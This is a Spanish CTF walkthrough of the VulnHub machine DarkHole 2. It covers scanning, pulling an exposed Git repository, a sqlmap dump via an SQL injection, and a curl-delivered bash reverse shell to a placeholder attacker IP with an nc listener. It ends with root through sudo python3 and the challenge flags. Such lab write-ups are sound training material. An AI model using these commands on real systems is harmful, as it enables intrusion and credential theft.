---
tags:
  - CTF
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/darkhole2
dificultad: Fácil
os: Linux
relacionados:
  - "[[03 - Conceptos/SSH|SSH]]"
  - "[[SQL Injection (SQLI)]]"
  - "[[Puerto interno]]"
  - "[[Port Forwarding]]"
  - "[[sqlmap]]"
  - "[[git]]"
---
#  VulnHub - DarkHole 2

## Reconocimiento

### nmap

```bash
nmap -sS --min-rate 5000 -sCV --open -n -Pn -p- -oN Ports 192.168.1.83
```

En el resultado se identificaron dos puertos principales:

- **22/tcp:** Se detectó el servicio SSH, utilizando OpenSSH 8.2p1 en una distribución Ubuntu.  
- **80/tcp:** Se encontró un servidor web Apache 2.4.41, también sobre Ubuntu, que servía un panel de login.

### [[git]]

Al acceder al puerto 80 se observó que el panel de login no ofrecía ninguna pista directa sobre credenciales, sin embargo, el análisis de la estructura de directorios reveló que existía un directorio oculto `/.git/`. La presencia de este directorio indicaba que se había dejado expuesto el repositorio Git del sitio web, lo cual permitía descargar el historial de cambios y examinar el código fuente.

Para obtener dicho repositorio se utilizó el siguiente comando:

```bash
wget --recursive 192.168.1.83:80/.git/
```

Esta acción permitió recuperar varios archivos, entre ellos `index.html`, `login.php` y la carpeta `.git` con toda su historia. La descarga del repositorio abrió la posibilidad de revisar los commits realizados, lo cual sería clave para descubrir credenciales y otros detalles sensibles.

---

## Análisis de vulnerabilidades

### Exposición de información en el repositorio [[Git]]

Una vez descargado el repositorio, se procedió a analizar el historial de commits mediante:
```bash
git log
```

Durante esta revisión se identificó un commit en particular (ID `a4d900a8d85e8938d3601f3cef113ee293028e10`) que resultó ser muy revelador. Al inspeccionar su contenido con:
```bash
git show a4d900
```

se pudo ver que el archivo `login.php` había sido modificado para incluir unas credenciales por defecto. Concretamente, el fragmento de código revelaba:
```php
if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
    $_SESSION['userid'] = 1;
    header("location:dashboard.php");
    die();
}
```

Esto reveló que el panel de login aceptaba el correo **lush@admin.com** y la contraseña **321** sin mayores restricciones, lo que evidenciaba una mala práctica de seguridad en el manejo de credenciales.

### [[SQL Injection (SQLI)|SQL Injection (SQLI)]] en la aplicación

Una vez accedido al panel de login y al interior de la aplicación, se observó que la URL del dashboard contenía un parámetro `id` que era vulnerable a inyección SQL. Esto se evidenció al interactuar con el sistema, ya que el parámetro permitía manipular las consultas SQL que se ejecutaban en el backend.

Se aprovechó esta vulnerabilidad utilizando la herramienta SQLMAP con el siguiente comando:
```bash
sqlmap -u "http://192.168.1.83/dashboard.php?id=1" --cookie "PHPSESSID=m4p16840eqi6g1alsg4phhbi6m" -D darkhole_2 --dump
```

[[SQLMAP]] identificó que el parámetro `id` era susceptible a inyecciones tanto de tipo time-based blind como de UNION query, lo que permitió extraer datos de la base de datos `darkhole_2`. Entre la información obtenida, se destacaron:

- De la tabla `ssh`: Credenciales con usuario **jehad** y contraseña **fool**.  
- De la tabla `users`: Confirmación de las credenciales utilizadas en el login web.

El análisis de estas vulnerabilidades evidenció múltiples puntos débiles en el sistema, derivados tanto de la exposición del repositorio como de la incorrecta parametrización de las consultas SQL.

---

## Explotación de vulnerabilidades

### Acceso a la aplicación web y vía [[SSH]]

Con las credenciales extraídas del repositorio Git (para el panel web) y de la base de datos (para SSH), se procedió a acceder al sistema de dos formas distintas:

1. **Acceso al panel web:**  
   Se utilizaron las credenciales **lush@admin.com:321** para iniciar sesión en la aplicación web, permitiendo la interacción con el panel de usuario.

2. **Acceso vía SSH:**  
   Con la información de la tabla `ssh` se inició una sesión SSH empleando:
   ```bash
   ssh jehad@192.168.1.83
   ```
   
   La conexión se realizó satisfactoriamente y se verificó que el usuario `jehad` tenía acceso al sistema, confirmándose el banner del sistema Ubuntu 20.04 LTS.

### Explotación del SQL Injection

La explotación del SQL Injection permitió extraer información sensible que incrementó el alcance del ataque. Mediante la herramienta SQLMAP, se obtuvo un volcado completo de las tablas críticas de la base de datos `darkhole_2`, lo que no solo confirmó las credenciales ya descubiertas, sino que también sirvió para mapear la estructura interna del sistema, proporcionando un panorama claro de los posibles vectores de ataque.

---

## Escalada de privilegios

### Servicio vulnerable en el [[Puerto interno]] 9999

Revisando el historial de comandos del usuario `jehad` (contenido en el archivo `.bash_history`), se observó que se estaban realizando peticiones a un servicio local en el puerto 9999 mediante comandos `curl`. Por ejemplo, se encontraron entradas como:

```bash
curl "http://localhost:9999/?cmd=id"
```

La respuesta a estos comandos indicaba que la ejecución de los comandos se realizaba con los privilegios del usuario `losy` (se obtuvo `uid=1002(losy)`), lo que evidenciaba que el servicio escuchado en el puerto 9999 permitía la ejecución arbitraria de comandos.

Para interactuar con este servicio, se consideraron dos posibilidades:

1. **Ejecución directa desde la víctima:**  
   Si se tiene acceso SSH a la máquina víctima, se puede ejecutar directamente el comando de reverse shell desde otra conexión ssh. Por ejemplo:
   ```bash
   curl -G http://127.0.0.1:9999/ --data-urlencode "cmd= bash -c 'bash -i >& /dev/tcp/TU_IP/443 0>&1'"
   ```

   Al ejecutar este comando en la víctima, se instruye al servicio vulnerable para que lance una shell interactiva que se conecte a la máquina atacante en el puerto 443, siempre que en la máquina atacante se tenga un listener activo.

2. **Uso de [[Port Forwarding]] (túnel SSH):**  
   Dado que el puerto 9999 está restringido a la interfaz local (localhost) de la víctima y no es accesible desde el exterior, se puede emplear un túnel SSH para redirigir el tráfico de ese puerto a la máquina atacante. Esto se logra con el siguiente comando, ejecutado desde la máquina atacante:
   ```bash
   ssh -L 9999:127.0.0.1:9999 losy@192.168.1.83
   ```

   Con este túnel, el puerto 9999 de la víctima queda mapeado a `localhost:9999` en la máquina atacante, lo que permite enviar peticiones al servicio vulnerable como si se estuviera interactuando localmente en la víctima. Posteriormente, se puede enviar el comando de reverse shell a través de este túnel:
   ```bash
   curl -G http://127.0.0.1:9999/ --data-urlencode "cmd= bash -c 'bash -i >& /dev/tcp/TU_IP/443 0>&1'"
   ```

   En ambos casos, es fundamental tener un listener activo en la máquina atacante, por ejemplo:
   ```bash
   nc -lnvp 443
   ```

   De esta forma, se logra establecer una conexión reversa y obtener una shell interactiva que corre bajo los privilegios del usuario `losy`.

### Escalada final a root

Encuentro la pass de `losy` en el `.bash_history` (es `gang`)

Una vez obtenida la shell como usuario `losy`, se procedió a revisar los privilegios asignados. Con el comando:
```bash
sudo -l
```

Se constató que `losy` tenía permiso para ejecutar el comando `/usr/bin/python3` como root sin mayores restricciones. Aprovechando esta configuración, se ejecutó Python con privilegios elevados:
```bash
sudo python3
```

Dentro del intérprete de Python se importó el módulo `os` y se ejecutó el siguiente comando para obtener una shell con privilegios de root:
```python
import os
os.system('bash')
```

Con esta acción se logró la escalada final, pasando de un usuario con privilegios limitados a una cuenta con control total sobre el sistema (root).

---

## Bandera(s)

> [!FLAG] `flag{user}`
DarkHole{'This_is_the_life_man_better_than_a_cruise'}
^bandera

> [!FLAG] `flag{root}`
> DarkHole{'Legend'}
^bandera